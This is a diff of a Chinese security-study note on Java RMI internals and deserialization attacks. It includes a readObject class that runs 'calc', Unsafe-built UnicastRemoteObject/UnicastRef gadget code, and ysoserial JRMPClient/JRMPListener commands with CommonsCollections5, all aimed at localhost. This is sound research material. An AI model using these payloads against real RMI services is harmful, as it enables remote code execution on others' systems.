@@ -1,8 +1,9 @@
 # 0x01 What is RMI
 
-`Remote Method Invocation` 远程方法调用。
+`RMI：Remote Method Invocation` 远程方法调用。
 
 * RMI为应用提供了远程调用的接口（Java的RPC框架）
+* 调用远程位置对象的方法
 * 实现RMI的协议叫JRMP
 * RMI实现过程存在Java对象的传递，因此涉及到反序列化
 
@@ -33,8 +34,14 @@
 * 客户端和服务端都需定义用于远程调用的接口
 * 接口必须继承`java.rmi.Remote`接口
 * 接口中的方法都要抛出`java.rmi.RemoteException`异常
-* 服务端创建远程接口实现类，实现接口定义的方法
+* 服务端创建接口实现类，实现接口定义的方法
 * 实现类继承`java.rmi.server.UnicastRemoteObject`
+
+这里要求实现类继承`UnicastRemoteObject`，方便自动将这个远程对象导出供客户端调用
+
+当然不继承也行，但后面得手动调用`UnicastRemoteObject#exportObject`，导出对象时可以指定监听端口来接收`incoming calls`，默认为随机端口。由上图可知远程对象会被注册到`RMI Registry`中，所以实际上不需要通过注册中心，只要我们知道导出的远程对象监听的端口号，也可以和它直接通信。
+
+`RMI Registry`注册中心存储着远程对象的引用（Reference）和其绑定的名称（Name），客户端通过名称找到远程对象的引用（Reference），再由这个引用就可以调用到远程对象了。
 
 📌服务端
 
@@ -45,8 +52,8 @@ import java.rmi.Remote;
 import java.rmi.RemoteException;
 
 public interface Hello extends Remote {
-    String sayHello() throws RemoteException;
-    String sayGoodbye() throws RemoteException;
+    String sayHello(Object s) throws RemoteException;
+    String sayGoodBye() throws RemoteException;
 }
 ```
 
@@ -56,21 +63,20 @@ public interface Hello extends Remote {
 import java.rmi.RemoteException;
 import java.rmi.server.UnicastRemoteObject;
 
-public class RemoteHello extends UnicastRemoteObject implements Hello {
-
-    public RemoteHello() throws RemoteException {
+public class RemoteHello extends UnicastRemoteObject implements Hello{
+    protected RemoteHello() throws RemoteException {
     }
 
     @Override
-    public String sayHello() throws RemoteException {
+    public String sayHello(Object s) throws RemoteException {
         System.out.println("sayHello Called");
-        return "Hello RMI";
+        return "Hello " + s;
     }
 
     @Override
-    public String sayGoodbye() throws RemoteException {
+    public String sayGoodBye() throws RemoteException {
         System.out.println("sayGoodbye Called");
-        return "Bye";
+        return "Bye~";
     }
 }
 ```
@@ -79,18 +85,23 @@ public class RemoteHello extends UnicastRemoteObject implements Hello {
 使用`LocateRegistry#createRegistry()`来创建注册中心，`Registry#bind()`进行绑定
 
 ```java
+import java.rmi.Naming;
 import java.rmi.registry.LocateRegistry;
-import java.rmi.registry.Registry;
 
 public class RMIServer {
     public static void main(String[] args) throws Exception {
+        LocateRegistry.createRegistry(1099);
         RemoteHello hello = new RemoteHello();
-        Registry r = LocateRegistry.createRegistry(9999);
-        System.out.println("Registry Start");
-        r.bind("hello", hello);
+        Naming.bind("rmi://127.0.0.1:1099/hello", hello);
     }
 }
 ```
+
+`java.rmi.Naming`用来对注册中心进行操作，提供lookup、bind、rebind、unbind、list这些方法来查询、绑定远程对象。
+
+这些方法的第一个参数都接收一个URL字符串，`rmi://host:port/name`，表示注册中心所在主机和端口，远程对象引用的名称。
+
+一般注册中心和服务端都在同一主机。
 
 📌客户端
 
@@ -105,16 +116,52 @@ import java.rmi.registry.LocateRegistry;
 import java.rmi.registry.Registry;
 
 public class RMIClient {
-    public static void main(String[] args) throws Exception{
-        Registry r = LocateRegistry.getRegistry("127.0.0.1", 9999);
-        Hello stub = (Hello) r.lookup("hello");
-        System.out.println(stub.sayHello());
-        System.out.println(stub.sayGoodBye());
+    public static void main(String[] args) throws Exception {
+        Registry registry = LocateRegistry.getRegistry("127.0.0.1", 1099);
+        Hello hello = (Hello) registry.lookup("hello");
+
+        System.out.println(hello.sayHello("taco"));
+        System.out.println(hello.sayGoodBye());
     }
 }
 ```
 
-![image-20231011220541151](./../.gitbook/assets/image-20231011220541151.png)
+RMI支持动态类加载来进行反序列化。上面的远程方法调用涉及方法参数的传递，若客户端传递了一个服务端不存在的类对象，服务端如何进行反序列化呢？若设置了`java.rmi.server.codebase`，则服务端会尝试从其地址加载字节码。
+
+```java
+System.setProperty("java.rmi.server.codebase", "http://127.0.0.1:8888/");
+```
+
+客户端创建此类`Calc`
+
+```java
+import java.io.IOException;
+import java.io.Serializable;
+
+public class Calc implements Serializable {
+    private void readObject(java.io.ObjectInputStream s) throws IOException, ClassNotFoundException {
+        try {
+            Runtime.getRuntime().exec("calc");
+        } catch (IOException e) {
+            throw new RuntimeException(e);
+        }
+        s.defaultReadObject();
+    }
+}
+```
+
+服务端需要增加如下安全管理器和安全策略的设置，这里直接给足权限
+
+```java
+System.setProperty("java.security.policy", RMIServer.class.getClassLoader().getResource("rmi.policy").toString());
+if (System.getSecurityManager() == null) {
+    System.setSecurityManager(new RMISecurityManager());
+}
+```
+
+![image-20240223124849755](./../.gitbook/assets/image-20240223124849755.png)
+
+![image-20240223122831102](./../.gitbook/assets/image-20240223122831102.png)
 
 # 0x03 Deep Source
 
@@ -124,44 +171,62 @@ public class RMIClient {
 RemoteHello remoteHello = new RemoteHello();
 ```
 
-`RemoteHello`继承了`UnicastRemoteObject`，构造时会调用父类的构造方法，用于创建和导出一个`UnicastRemoteObject`对象，这个对象通过`RMISocketFactory`创建的服务端套接字来导出。`port=0`会选择一个匿名(随机)端口，导出的远程对象通过这个端口号来接收发送进来的调用请求。
-![image-20231011195355882](../.gitbook/assets/image-20231011195355882.png)
+`RemoteHello`继承了`UnicastRemoteObject`，实例化时会调用父类的构造方法，用于创建和导出远程对象，这个对象通过`RMISocketFactory`创建的服务端套接字来导出。`port=0`会选择一个匿名(随机)端口，导出的远程对象通过这个端口号来接收发送进来的调用请求。
 
-接着又创建了一个`UnicastServerRef`对象，这个对象存在多层封装，与网络连接有关，这里跳过。
+![image-20231011195355882](./../.gitbook/assets/image-20240223125958086.png)
 
-![image-20231011195536141](../.gitbook/assets/image-20231011195536141.png)
+```java
+protected UnicastRemoteObject(int port) throws RemoteException{
+    this.port = port;
+    exportObject((Remote) this, port);
+}
+```
 
-`UnicastServerRef`对象被传入了远程对象的ref属性。可以看到`UnicastServerRef`的`LiveRef`属性中存在一些和网络有关的信息
+接着传入端口号创建了一个`UnicastServerRef`对象（远程引用）
+
+这个对象存在多层封装，与网络连接有关，这里跳过。
+
+![image-20240223130331737](./../.gitbook/assets/image-20240223130331737.png)
+
+`UnicastServerRef`对象被传入了远程对象的ref属性，即这个远程对象的远程引用。
 
 接着进入`UnicastServerRef#exportObject`
 
-![image-20231011200659535](./../.gitbook/assets/image-20231011200659535.png)
+![image-20240223131314644](./../.gitbook/assets/image-20240223131314644.png)
 
 存根Stub出现了！它是通过`sun.rmi.server.Util#createProxy()`创建的代理类
 
 跟进`createProxy`可以看到熟悉的`Proxy.newProxyInstance()`创建动态代理。
 
-![image-20231011201059859](./../.gitbook/assets/image-20231011201059859.png)
+![image-20240223131702476](./../.gitbook/assets/image-20240223131702476.png)
+
+`clientRef`是上面创建的`UnicastServerRef`的`LiveRef`属性封装的一个`UnicastRef`
+
+![image-20240223132718662](./../.gitbook/assets/image-20240223132718662.png)
 
 这里的`RemoteObjectInvocationHandler`关系到远程方法的调用，下文在客户端讲解。
 
 接着返回到`exportObject`方法
 
-![image-20231011201751052](./../.gitbook/assets/image-20231011201751052.png)
+![image-20240223133156955](./../.gitbook/assets/image-20240223133156955.png)
+
+（先说一下这里的`hashToMethod_Map`存储的是方法哈希和方法的对应关系，后面远程调用是根据方法哈希找到方法的）
 
 创建了一个`sun.rmi.transport.Target`对象
 
 这个Target对象封装了生成的动态代理类stub还有远程对象impl，再通过`LiveRef#exportObject`将target导出
 
-![image-20231011202311356](./../.gitbook/assets/image-20231011202311356.png)
+![image-20240223133449915](./../.gitbook/assets/image-20240223133449915.png)
 
-`listen()`为stub开启随机端口，再`TCPTransport#exportObject`将target注册到`ObjectTable`中
+`listen()`为stub开启随机端口，在`TCPTransport#exportObject`将target注册到`ObjectTable`中
 
-![image-20231011202859199](./../.gitbook/assets/image-20231011202859199.png)
+![image-20240223133818074](./../.gitbook/assets/image-20240223133818074.png)
 
 最后target是被放入`objTable`和`implTable`中
 
 从键`oe`、`weakImpl`可以看出，`ObjectTable`提供`ObjectEndpoint`和`Remote实例`两种方式来查找`Target`
+
+![image-20240223142611297](./../.gitbook/assets/image-20240223142611297.png)
 
 ## 注册中心创建
 
@@ -169,27 +234,23 @@ RemoteHello remoteHello = new RemoteHello();
 Registry r = LocateRegistry.createRegistry(9999);
 ```
 
-![image-20231011204103140](./../.gitbook/assets/image-20231011204103140.png)
+![image-20240223143228489](./../.gitbook/assets/image-20240223143228489.png)
 
 传入端口号创建`sun.rmi.registry.RegistryImpl`
 
-![image-20231011204448903](./../.gitbook/assets/image-20231011204448903.png)
+这里说注册中心的导出和`UnicastRemoteObject#exportObject`的导出逻辑一样
 
-同样`LiveRef`对象与网络有关，注意这里给`LiveRef`传入了一个id
+不同的是注册中心的对象标识符是一个特殊的ID 0，客户端第一次连接时才能通过这个id找到注册中心
 
-![image-20231012095046996](./../.gitbook/assets/image-20231012095046996.png)
+![image-20240223143710091](./../.gitbook/assets/image-20240223143710091.png)
 
-id的值为0，这是注册中心特殊的id，客户端第一次连接时才能通过这个id找到注册中心
+同样`LiveRef`对象与网络有关，这里给`LiveRef`传入了特殊id——0，接着调用`setup()`
 
-接着调用`setup()`
-
-![image-20231011204633555](./../.gitbook/assets/image-20231011204633555.png)
-
-![image-20231011211259396](./../.gitbook/assets/image-20231011211259396.png)
+![image-20240223144118824](./../.gitbook/assets/image-20240223144118824.png)
 
 依旧调用`UnicastServerRef#exportObject`，不过上面导出的是`UnicastRemoteObject`，这里导出的是`RegistryImpl`
 
-![image-20231011205336742](./../.gitbook/assets/image-20231011205336742.png)
+![image-20240223144241387](./../.gitbook/assets/image-20240223144241387.png)
 
 同样进行动态代理创建，不过上面导出`UnicastRemoteObject`的过程略过了这一步分析 —— `stubClassExists`的判断
 
@@ -199,9 +260,9 @@ id的值为0，这是注册中心特殊的id，客户端第一次连接时才能
 
 而现在要导出的是`RegistryImpl`，会去找`RegistryImpl_Stub`
 
-![image-20231011205539790](./../.gitbook/assets/image-20231011205539790.png)
+![image-20240223144322461](./../.gitbook/assets/image-20240223144322461.png)
 
-获取委托类（这里是`RegistryImpl`）的名字前面加`_Stub`看是否存在
+获取委托类（这里是`RegistryImpl`）的名字后面加`_Stub`看是否存在
 
 全局一搜还真有，`sun.rmi.registry.RegistryImpl_Stub`
 
@@ -211,15 +272,15 @@ id的值为0，这是注册中心特殊的id，客户端第一次连接时才能
 
 返回到动态代理的创建，接着`createStub`，通过反射实例化`RegistryImpl_Stub`实例对象
 
-![image-20231011210824640](./../.gitbook/assets/image-20231011210824640.png)
+![image-20240223144823140](./../.gitbook/assets/image-20240223144823140.png)
 
 `createStub`之后判断stub是否为`RemoteStub`实例（`RegistryImpl_Stub`继承了`RemoteStub`），进入`setSkeleton`
 
-![image-20231011211530120](./../.gitbook/assets/image-20231011211530120.png)
+![image-20240223144926955](./../.gitbook/assets/image-20240223144926955.png)
 
 `Util.createSkeleton`方法创建skeleton
 
-![image-20231011211739045](./../.gitbook/assets/image-20231011211739045.png)
+![image-20240223145111849](./../.gitbook/assets/image-20240223145111849.png)
 
 和`createStub`类似，通过反射实例化`RegistryImpl_Skel`
 
@@ -241,15 +302,33 @@ id的值为0，这是注册中心特殊的id，客户端第一次连接时才能
 
   ![image-20231011212424338](./../.gitbook/assets/image-20231011212424338.png)
 
+由上可知注册中心就是一个特殊的远程对象
+
+和普通远程对象创建的差异：
+
+* LiveRef的id为0
+* 远程对象Stub为动态代理，注册中心的Stub为`RegistryImpl_Stub`，同时还创建了`RegistryImpl_Skel`
+* 远程对象端口默认随机，注册中心端口默认1099
+
 ## 服务注册
+
+一般注册中心和服务端都在一起，`createRegistry`直接调用其`bind`方法即可
+
+这里的`Registry`是`RegistryImpl`
 
 ```java
 r.bind("hello", remoteHello);
 ```
 
-![image-20231011220331450](./../.gitbook/assets/image-20231011220331450.png)
+![image-20240223152008143](./../.gitbook/assets/image-20240223152008143.png)
 
 把name和obj放到`bindings`这个hashtable中
+
+若调用的是`Naming#bind`
+
+![image-20240223152655973](./../.gitbook/assets/image-20240223152655973.png)
+
+这里`getRegistry`获取到的是`RegistryImpl_Stub`，具体流程在下面的客户端请求注册中心中讲解。
 
 ## 客户端请求注册中心-客户端
 
@@ -257,11 +336,11 @@ r.bind("hello", remoteHello);
 Registry r = LocateRegistry.getRegistry("127.0.0.1", 9999);
 ```
 
-![image-20231011221451323](./../.gitbook/assets/image-20231011221451323.png)
+![image-20240223153104992](./../.gitbook/assets/image-20240223153104992.png)
 
-通过传入的host和port创建一个`LiveRef`用于网络请求，通过`UnicastRef`进行封装。(服务端是`UnicastServerRef`)
+通过传入的host和port创建一个`LiveRef`用于网络请求（注意这里传入的ObjID也是0），通过`UnicastRef`进行封装。
 
-然后和注册中心的逻辑相同，创建了一个`RegistryImpl_Stub`对象
+然后和注册中心的逻辑相同，尝试创建代理，这里获取了一个`RegistryImpl_Stub`对象
 
 接着通过`lookup`与注册中心通信，查找远程对象获取存根
 
@@ -278,45 +357,74 @@ Hello stub = (Hello) r.lookup("hello");
 * `newCall`建立与远程注册中心的连接
 * 通过序列化将要查找的名称写入输出流（这里是hello）
 * 调用`UnicastRef`的invoke方法（invoke会调用`StreamRemoteCall#executeCall`，释放输出流，调用远程方法，将结果写进输入流）
-* 获取输入流，将返回值进行反序列化，得到注册中心的动态代理Stub
+* 获取输入流，将返回值进行反序列化，得到远程对象的动态代理Stub
+
+`UnicastRef#invoke`具体下文分析
+
+看一下这里`StreamRemoteCall`的创建，`UnicastRef#newCall`
+
+![image-20240223162217504](./../.gitbook/assets/image-20240223162217504.png)
+
+这里写入了opnum，`bind/0`、`list/1`、`lookup/2`对应不同的opnum，
+
+同时写入了`ref.getObjID()`
+
+* 对于`RegistryImpl_Stub`，这里就是0
+* 对于普通远程对象的动态代理Stub，这里就是其对应的id
+
+若这里是服务端，将进行`bind`操作，将远程对象及其名称🚩序列化后传给注册中心
+
+![image-20240223154800101](./../.gitbook/assets/image-20240223154800101.png)
 
 ## 客户端请求注册中心-注册中心
 
-注册中心由`sun.rmi.transport.tcp.TCPTransport#handleMessages`来处理请求（上面就是这个`TCPTransport`导出的target）
+注册中心由`sun.rmi.transport.tcp.TCPTransport#handleMessages`来处理请求
 
-进入`serviceCall`
+根据数据流的第一个操作数数值决定如何处理数据，主要当然是`Call`操作
 
-![image-20231011233431696](./../.gitbook/assets/image-20231011233431696.png)
+创建了一个`StreamRemoteCall`（和客户端一样），进入`serviceCall`
 
-![image-20231012095916161](./../.gitbook/assets/image-20231012095916161.png)
+![image-20240223155615552](./../.gitbook/assets/image-20240223155615552.png)
 
-由target获取到`RegistryImpl`对象，`impl`和`call`传入`dispatch`方法
+![image-20240223160532165](./../.gitbook/assets/image-20240223160532165.png)
 
-![image-20231012100729106](./../.gitbook/assets/image-20231012100729106.png)
+由target获取到`UnicastServerRef`远程对象引用`disp`，以及远程对象`impl`（这里是`RegistryImpl`）
 
-判断`skel`是否为空来区别`RegistryImpl`和`UnicastRemoteObject`
+进入`UnicastServerRef#dispatch(impl,call)`
 
-![image-20231012101043877](./../.gitbook/assets/image-20231012101043877.png)
+![image-20240223163038079](./../.gitbook/assets/image-20240223163038079.png)
 
-这里的num是操作数，接着进入`oldDispatch`
+该方法负责将方法调用分发给服务端的远程对象，以及序列化服务端调用返回的结果
 
-![image-20231012101513889](./../.gitbook/assets/image-20231012101513889.png)
+判断`skel`是否为空来区别`RegistryImpl`和`UnicastRemoteObject`（即区别注册中心和普通远程对象）
+
+这里的num是操作数（上面的opnum），接着进入`oldDispatch`
+
+![image-20240223163452335](./../.gitbook/assets/image-20240223163452335.png)
 
 接着调用`RegistryImpl_Skel#dispatch`，根据opnum进行不同的处理
 
 ![image-20230121162856291](../.gitbook/assets/image-20230121162856291.png)
 
-这里是2对应`lookup`
+这里是2对应`lookup`，从数据流中读取名称字符串
 
 ![image-20230121162954459](../.gitbook/assets/image-20230121162954459.png)
 
 从`bindings`中获取
 
-![image-20230121163027271](../.gitbook/assets/image-20230121163027271.png)
+![image-20240223163715312](./../.gitbook/assets/image-20240223163715312.png)
 
 ![image-20230121163103768](../.gitbook/assets/image-20230121163103768.png)
 
 获取完后将序列化的值传过去
+
+若这里是服务端进行的bind请求：反序列化得到远程对象和其名称
+
+![image-20240223165527384](./../.gitbook/assets/image-20240223165527384.png)
+
+再放入bindings这个HashMap中
+
+![image-20240223165606588](./../.gitbook/assets/image-20240223165606588.png)
 
 ## 客户端请求服务端-客户端
 
@@ -324,15 +432,20 @@ Hello stub = (Hello) r.lookup("hello");
 stub.sayHello()
 ```
 
-客户端调用服务端远程对象，还记得上面服务端的远程对象创建中，使用`Proxy.newProxyInstance()`创建了远程对象的动态代理
+客户端调用服务端远程对象，还记得上面服务端的远程对象创建中，使用`Proxy.newProxyInstance()`创建了远程对象的动态代理Stub
 
-`Hello stub = (Hello) r.lookup("hello");`已经获取到了这个远程对象的动态代理，调用处理器中已经包含了远程对象对应的`UnicastRef`
+`Hello stub = (Hello) r.lookup("hello");`已经获取到了这个远程对象的动态代理
+
+`InvocationHandler`中已经包含了远程对象对应的`UnicastRef`，即可以获取远程对象对应的id
 
 `RemoteObjectInvocationHandler#invoke`
 
-![image-20231012104513159](./../.gitbook/assets/image-20231012104513159.png)
+![image-20240223170729912](./../.gitbook/assets/image-20240223170729912.png)
 
-![image-20231012104609425](./../.gitbook/assets/image-20231012104609425.png)
+* 如果调用的是Object声明的方法（`getClass`、`hashCode`、`equals`之类的），接`invokeObjectMethod`
+* 若调用的是远程对象自己的方法，接`invokeRemoteMethod`
+
+![image-20240223170958598](./../.gitbook/assets/image-20240223170958598.png)
 
 `invokeRemoteMethod`中实际委托`RemoteRef`的子类`UnicastRef#invoke`来执行
 
@@ -344,21 +457,27 @@ stub.sayHello()
 
 若方法有参数，调用`marshalValue`将参数序列化，并写入输出流
 
-![image-20231012110427988](./../.gitbook/assets/image-20231012110427988.png)
+![image-20240223171856459](./../.gitbook/assets/image-20240223171856459.png)
+
+![image-20240223171958751](./../.gitbook/assets/image-20240223171958751.png)
 
 接着调用`executeCall`
 
-![image-20231012111017505](./../.gitbook/assets/image-20231012111017505.png)
+![image-20240223172531707](./../.gitbook/assets/image-20240223172531707.png)
 
 `releaseOutputStream()`释放输出流，即发送数据给服务端
 
 `getInputStream`读取返回的数据，写到`in`中
 
-![image-20231012114907326](./../.gitbook/assets/image-20231012114907326.png)
+![image-20240224135035161](./../.gitbook/assets/image-20240224135035161.png)
 
-通过`unmarshalValue()`去反序列化获取返回值
+注意这里读取返回数据流中的返回类型，若返回类型为`异常返回`，直接进行反序列化🚩
 
-![image-20231012123618805](./../.gitbook/assets/image-20231012123618805.png)
+![image-20240223172624949](./../.gitbook/assets/image-20240223172624949.png)
+
+若为正常返回，通过`unmarshalValue()`去反序列化获取返回值
+
+![image-20240223172659428](./../.gitbook/assets/image-20240223172659428.png)
 
 先判断方法的返回类型是否为基本类型，不是的话调用原生反序列化。🚩`readObject`被调用
 
@@ -384,7 +503,29 @@ stub.sayHello()
 
 服务端通过`ObjectTable#putTarget`将注册的远程对象放入`objTable`中，里面有默认的`DGCImpl`对象
 
-DGCImpl的设计是单例模式，这个类是RMI的分布式垃圾回收类。和注册中心类似，也有对应的`DGCImpl_Stub`和`DGCImpl_Skel`，同样类似注册中心，客户端本地也会生成一个`DGCImpl_Stub`，并调用`DGCImpl_Stub#dirty`，用来向服务端“租赁”远程对象的引用。
+DGCImpl的设计是单例模式，这个类是RMI的分布式垃圾回收类。和注册中心类似，也有对应的`DGCImpl_Stub`和`DGCImpl_Skel`，同样类似注册中心，客户端本地也会生成一个`DGCImpl_Stub`，并调用`DGCImpl_Stub#dirty`，用来向服务端”租赁”远程对象的引用。
+
+当注册中心返回一个Stub给客户端时，其跟踪Stub在客户端中的使用。当再没有更多的对Stub的引用时，或者如果引用的“租借”过期并且没有更新，服务端将垃圾回收远程对象。`dirty`用来续租，`clean`用来清除远程对象。
+
+租期默认10分钟，`DGCImpl`的ObjId为2
+
+![image-20240224120549132](./../.gitbook/assets/image-20240224120549132.png)
+
+`DGCImpl`的静态代码块中进行类实例化，并封装为target放入`objTable`。
+
+![image-20240224120922314](./../.gitbook/assets/image-20240224120922314.png)
+
+哪里触发的这个静态代码块？其实每有一个Target被创建，都会调用到`DGCImpl`去监控这个对象。
+
+但一般最早被触发应该是`LocateRegistry#createRegistry`创建注册中心时。
+
+![image-20240224161001367](./../.gitbook/assets/image-20240224161001367.png)
+
+`permanent`默认为true，进入`pinImpl`
+
+![image-20240224161126984](./../.gitbook/assets/image-20240224161126984.png)
+
+`DGCImpl_Stub#dirty`
 
 ![image-20230121182935259](../.gitbook/assets/image-20230121182935259.png)
 
@@ -399,9 +540,44 @@ DGCImpl的设计是单例模式，这个类是RMI的分布式垃圾回收类。�
 
 两个case分支都有readObject，🚩`readObject`被调用
 
-# 0x03 CodeBase
+# 0x04 SumUp
 
-RMI还有一个特点就是动态加载类，如果当前JVM中没有某个类的定义，它可以从远程URL去下载这个类的class
+上面记了一堆流水账，大概总结一下服务创建、发现、调用的过程
+
+服务注册：
+
+* 远程对象创建
+  * 远程对象继承`UnicastRemoteObject`，`exportObject`用于将这个对象导出，每个远程对象都有对应的远程引用（`UnicastServerRef`）
+  * 对象导出是指，创建远程对象的动态代理，并将对象的方法和方法哈希存储到远程引用的`hashToMethod_Map`里，后面客户端通过传递方法哈希来找到对应的方法。同时开启一个socket监听到来的请求。远程对象、动态代理和对象id被封装为Target，target会被存储到`TCPTransport`的`objTables`里，后面客户端通过传递对象id可获取到对应target。
+  * 动态代理Stub中含有这个远程对象的联系方式（`LiveRef`，包括主机、端口、对象id）
+* 注册中心创建
+  * `LocateRegistry#createRegistry`用于创建注册中心`RegistryImpl`
+  * 注册中心是一个特殊的远程对象，对象id为0
+  * 导出时不会创建动态代理，而是找到`RegistryImpl_Stub`，同时创建了对应的骨架`RegistryImpl_Skel`，Stub会被序列化传递给客户端，其重写了`Registry`的`lookup`、`bind`等方法，会对传输和接收的数据流进行序列化和反序列化
+  * 后面的socket端口监听、target存储到`objTables`和远程对象的导出一致
+* 将远程对象注册到服务中心
+  * 一般注册中心和服务端都在一起，可直接调用`createRegistry`返回的`RegistryImpl#bind`，也可以用`Naming#bind`，后者是通过`RegistryImpl_Stub`将服务名称和远程对象的动态代理Stub序列化后传递给注册中心，注册中心再进行`RegistryImpl#bind`
+
+服务发现：
+
+* `LocateRegistry.getRegistry`用于获取注册中心的Stub，即`RegistryImpl_Stub`，过程和注册中心的创建一样，都是调用`Util#createProxy`
+* 注册中心实际上相当于一个客户端知道其端口号的远程对象
+* `RegistryImpl_Stub#lookup`首先建立与注册中心的连接，服务名称序列化后写入输出流，释放输出流，等待远程返回，获取输入流进行反序列化，得到远程对象的动态代理Stub
+* `TCPTransport`负责处理到来的数据，根据对象id获取对应的target，接着获取target中存储的`UnicastServerRef`
+* `UnicastServerRef#dispatch`通过客户端传递的一个num来区别是对注册中心的操作（≥0）还是对普通远程对象的操作（＜0）
+* `RegistryImpl_Skel`调用`RegistryImpl#lookup`，通过服务名称获取对应Stub，接着序列化返回给客户端
+
+服务调用：
+
+* 通过上面的`RegistryImpl_Stub#lookup`已经获取到远程对象的动态代理Stub，客户端可以直接和服务端通信了
+* 对动态代理进行方法调用会触发其`invoke`，进一步交给了`UnicastRef#invoke`，将方法哈希、参数序列化写入输出流，`StreamRemoteCall#executeCall`释放输出流，获取远程返回的输入流，回到`UnicastRef`对返回值进行反序列化
+* 服务端通过num为-1判断这不是对注册中心的操作，接着根据哈希值从`hashToMethod_Map`找到`Method`，反序列化参数，序列化调用结果，写入输出流返回给客户端
+
+彻底晕了😵不得不佩服RMI的设计者
+
+# 0x05 CodeBase
+
+RMI的一个特点就是动态加载类，如果当前JVM中没有某个类的定义，它可以从远程URL去下载这个类的class
 
 `java.rmi.server.codebase`属性值表示一个或多个URL位置，可以从中下载本地找不到的类，相当于一个代码库。
 
@@ -475,29 +651,30 @@ public String sayHello(Object s) throws RemoteException {
 
 `sun.rmi.server.LoaderHandler$Loader`这个类加载器是`URLClassLoader`的子类
 
-最后`Class<?> c = loadClassForName*(name, false, loader);`
+最后`Class<?> c = loadClassForName(name, false, loader);`
 
 ![image-20231012200428866](./../.gitbook/assets/image-20231012200428866.png)
 
 `Class.forName`指定了这个加载器去加载。后面会实例化这个类
 
-# 0x04 Attack RMI
+# 0x06 Attack RMI
 
 上面有`readObject`进行反序列化的地方存在被攻击的隐患
 
 1. 攻击客户端
    * RegistryImp_Stub#lookup   反序列化注册中心返回的Stub
-   * StreamRemoteCall#executeCall  反序列化远调方法的执行结果
+   * UnicastRef#invoke  反序列化远调方法的执行结果
+   * StreamRemoteCall#executeCall  反序列化远程调用返回的异常类
    * DGCImpl_Stub#dirty
 2. 攻击服务端
    * UnicastServerRef#dispatch     反序列化客户端传递的方法参数
    * DGCImpl_Skel#dispatch
 3. 攻击注册中心
-   * RegistryImp_Stub#bind
+   * RegistryImp_Stub#bind  注册中心反序列化服务端传递传来的远程对象
 
 ## 攻击服务端
 
-服务端：UnicastServer#dispatch 调用了`unmarshalValue`来反序列化客户端传来的远程方法参数
+服务端：UnicastServerRef#dispatch 调用了`unmarshalValue`来反序列化客户端传来的远程方法参数
 
 ### 远程方法参数为Object
 
@@ -562,7 +739,6 @@ public class Client {
 
         return expMap;
     }
-
 }
 ```
 
@@ -610,8 +786,6 @@ public interface Hello extends Remote {
 
 ## 攻击注册中心
 
-上面的演示中注册中心和服务端是在一起的，所以服务端在绑定对象时，直接使用的是Registry本Registry。
-
 注册中心和服务端是可以分开的，服务端可以使用`Naming`提供的接口来操作注册中心
 
 ```java
@@ -646,13 +820,140 @@ Naming.bind("rmi://127.0.0.1:1099/test", remote);
 客户端的攻击和上面的都类似，大概就下面几个攻击点
 
 * 恶意Server返回方法调用结果
-* 恶意Server Stub返回Registry代理对象
+* 恶意Registry返回Stub
 * 动态类加载（Server返回的调用结果若为客户端不存在的类，客户端也支持动态加载）
 
 ## 攻击DGC
 
-见ysoserial的`JRMPClient`
+DGCImpl_Stub#dirty
 
-# 0x05 Ref
+DGCImpl_Skel#dispatch
+
+见ysoserial的`exploit.JRMPListener`和` exploit.JRMPClient `
+
+# 0x07 Deser Gadgets
+
+## UnicastRemoteObject
+
+反序列化时会重新导出远程对象
+
+![image-20240223233308385](./../.gitbook/assets/image-20240223233308385.png)
+
+![image-20240223233417379](./../.gitbook/assets/image-20240223233417379.png)
+
+接下来的流程就和上面的一致了，不过这里的端口我们可以指定。
+
+下面就是触发JRMP监听端口（`TCPTransport#listen`），会对请求进行反序列化，对应`ysoserial.payloads.JRMPListener`，不过它是用的`ActivationGroupImpl`(`UnicastRemoteObject`的一个子类)
+
+```java
+public static void main(String[] args) throws Exception {
+    Class<?> clazz = Class.forName("sun.misc.Unsafe");
+    Field unsafeField = clazz.getDeclaredField("theUnsafe");
+    unsafeField.setAccessible(true);
+    Unsafe unsafe = (Unsafe) unsafeField.get(null);
+    Class<?> uroClazz = Class.forName("java.rmi.server.UnicastRemoteObject");
+    Object uro = unsafe.allocateInstance(uroClazz);
+    setFiled(uro, "port", 12233);
+    setFiled(uro, "ref", new UnicastServerRef(12233));
+    ser(uro);
+}
+
+public static void setFiled(Object o, String name, Object value) throws Exception {
+    Class<?> superClazz = o.getClass();
+    Field f = null;
+    while (true) {
+        try {
+            f = superClazz.getDeclaredField(name);
+            break;
+        } catch (NoSuchFieldException e) {
+            superClazz = superClazz.getSuperclass();
+        }
+    }
+    f.setAccessible(true);
+    f.set(o, value);
+}
+
+public static void ser(Object o) throws Exception {
+    ByteArrayOutputStream baos = new ByteArrayOutputStream();
+    ObjectOutputStream oos = new ObjectOutputStream(baos);
+    oos.writeObject(o);
+
+    Object oo = new ObjectInputStream(new ByteArrayInputStream(baos.toByteArray())).readObject();
+    Thread.sleep(100000);
+}
+```
+
+可以用`ysoserial.exploit.JRMPClient`去打，其原理是与DGC通信发送恶意payload让服务端进行反序列化
+
+`java -cp ysoserial.jar ysoserial.exploit.JRMPClient 127.0.0.1 12233 CommonsCollections5 "calc"`
+
+注意上面用`Object oo`接收了反序列化的结果，若不加这个打不通，猜测是因为Stub没被引用导致被垃圾回收了，监听的端口自然断开了，`ysoserial.exploit.JRMPClient`连不上去。
+
+## UnicastRef
+
+`UnicastRef`实现了`Externalizable`接口，反序列化时会调用`readExternal`
+
+![image-20240224122757788](./../.gitbook/assets/image-20240224122757788.png)
+
+`LiveRef#read`用于恢复`ref`属性
+
+![image-20240224123023925](./../.gitbook/assets/image-20240224123023925.png)
+
+`DGCClient.registerRefs`将其注册，用于垃圾回收
+
+![image-20240224123211777](./../.gitbook/assets/image-20240224123211777.png)
+
+`makeDirtyCall`即调用`dirty`
+
+![image-20240224123423300](./../.gitbook/assets/image-20240224123423300.png)
+
+![image-20240224123702271](./../.gitbook/assets/image-20240224123702271.png)
+
+接着就是发送DGC请求了，可以让其与一个恶意服务通信，返回恶意数据流，则会造成反序列化漏洞。配合`ysoserial.exploit.JRMPListener`构造恶意RMI服务，伪造`异常返回`，让客户端反序列化异常对象。
+
+```java
+ObjID id = new ObjID(new Random().nextInt());
+TCPEndpoint te = new TCPEndpoint("127.0.0.1", 12233);
+UnicastRef ref = new UnicastRef(new LiveRef(id, te, false));
+ser(ref);
+```
+
+`java -cp ysoserial.jar ysoserial.exploit.JRMPListener 12233 CommonsCollections5 "calc"`
+
+![image-20240224124804271](./../.gitbook/assets/image-20240224124804271.png)
+
+## RemoteObject
+
